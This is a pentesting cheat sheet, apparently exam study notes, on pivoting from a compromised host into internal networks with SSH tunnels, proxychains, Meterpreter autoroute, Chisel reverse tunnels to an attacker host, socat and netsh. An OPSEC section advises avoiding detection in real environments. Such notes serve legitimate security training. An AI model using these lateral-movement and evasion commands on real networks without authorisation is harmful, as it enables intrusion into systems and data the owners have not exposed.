
---

## 1. What is Pivoting?

Pivoting is the technique of using a **compromised host** to access **internal networks or hosts** that are not directly reachable from the attacker machine.

Key goals:

- Reach internal subnets
- Scan internal services    
- Exploit deeper systems
- Move laterally

_Tip: Pivoting is essential when direct access to target networks is restricted._

---

## 2. Common Pivoting Scenarios

- Internet → DMZ → Internal Network
- User Machine → Server Subnet
- Linux Jump Host → Windows Internal AD
- Compromised VPN Client → Corporate Network
    

_These scenarios help you plan which pivoting technique to use._

---

## 3. Network Discovery from Pivot Host

### Check Interfaces

```
ip a    # Shows all network interfaces and IP addresses
```

```
ifconfig  # Alternative command on older Linux systems
```

### Check Routing Table

```
ip route   # Shows routing table to discover reachable subnets
```

```
route -n   # Older syntax for Linux
```

### Identify Internal Subnets

```
arp -a   # Lists known hosts in the network
```

---

## 4. SSH Pivoting (Port Forwarding)

### Local Port Forwarding (Access Internal Service)

Forward target service to your local machine

```
ssh -L 8080:10.10.10.5:80 user@pivot_host
```

Access via:

```
http://127.0.0.1:8080
```

_Useful to access internal web apps securely._

---

### Remote Port Forwarding (Expose Local Service)

```
ssh -R 4444:127.0.0.1:4444 user@pivot_host
```

_Allows services on your machine to be accessed via the pivot host._

---

### Dynamic Port Forwarding (SOCKS Proxy)

- Instead of forwarding **one port → one service** (like local/remote forwarding), it lets you forward **ANY connection to ANY internal IP/port dynamically**.

```
ssh -D 9050 user@pivot_host
```

Configure proxychains:

```
socks5 127.0.0.1 9050
```

_Provides flexible routing of multiple tools through a SOCKS proxy._

---

## 5. Proxychains Pivoting

### Edit Proxychains Config

```
nano /etc/proxychains.conf
```

Add:

```
socks5 127.0.0.1 9050
```

_Configures tools to use your pivot proxy._

### Run Tools Through Proxychains

```
proxychains nmap -sT -Pn 10.10.10.0/24  # TCP scan via pivot
```

```
proxychains curl http://10.10.10.5   # Access internal web pages
```

---

## 6. Meterpreter Pivoting

### Add Route via Meterpreter

```
run autoroute -s 10.10.10.0/24   # Add internal subnet to route
```

### View Routes

```
run autoroute -p   # Shows current routes
```

### Scan Internal Network

```
use auxiliary/scanner/portscan/tcp  # Scan hosts inside internal network
```

_Meterpreter is great for multi-host pivoting within a compromised environment._

---

## 7. Chisel Pivoting (Recommended)

### Start Chisel Server (Attacker)

```
chisel server --reverse -p 8000  # Listen for reverse connections
```

### Connect from Pivot Host

```
chisel client attacker_ip:8000 R:socks   # Create reverse tunnel
```

### Use Proxychains

```
socks5 127.0.0.1 1080   # Route tools through Chisel tunnel
```

_Chisel is fast, reliable, and works well in restricted environments._

---

## 8. Socat Pivoting

### Forward Port via Socat

```
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80  # Forward internal service
```

_Simple TCP forwarding using socat, works on Linux and Windows with Cygwin._

---

## 9. Windows Pivoting Techniques

### Check Routes

```
route print  # Displays routing table
```

### Port Forward with Netsh

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5  # Forward port
```

_Built-in Windows solution for port forwarding._

---

## 10. SMB / RDP Pivoting

### SMB Through Proxychains

```
proxychains smbclient //10.10.10.5/share  # Access SMB shares via pivot
```

### RDP Through SSH Tunnel

```
ssh -L 3389:10.10.10.10:3389 user@pivot_host  # Access internal RDP
```

_Allows secure remote access to internal resources._

---

## 11. Nmap Through Pivot

### TCP Scan via Proxychains

```
proxychains nmap -sT -Pn -p 80,445 10.10.10.5  # TCP scan inside network
```

⚠️ SYN scans (`-sS`) will NOT work over SOCKS

_Scan internal hosts without direct network access._

---

## 12. Double Pivot (Multi-Hop)

- Pivot Host 1 → Pivot Host 2 → Internal Network
- Use chained SSH tunnels or nested Chisel sessions

_Useful for reaching deeply segmented networks._

---

## 13. OPSEC Notes

- Expect slower scans
- Avoid noisy scans (`-T5`)
- Monitor tunnel stability
- Log discovered subnets

_Maintain stealth and avoid detection when pivoting in real environments._

---

## 14. Mental Model (Exam Gold)

> **"If my shell can reach it, I can pivot to it."**

Always ask:

- What networks does this host see?
- Can I forward traffic through it?
- Which tool fits best here?
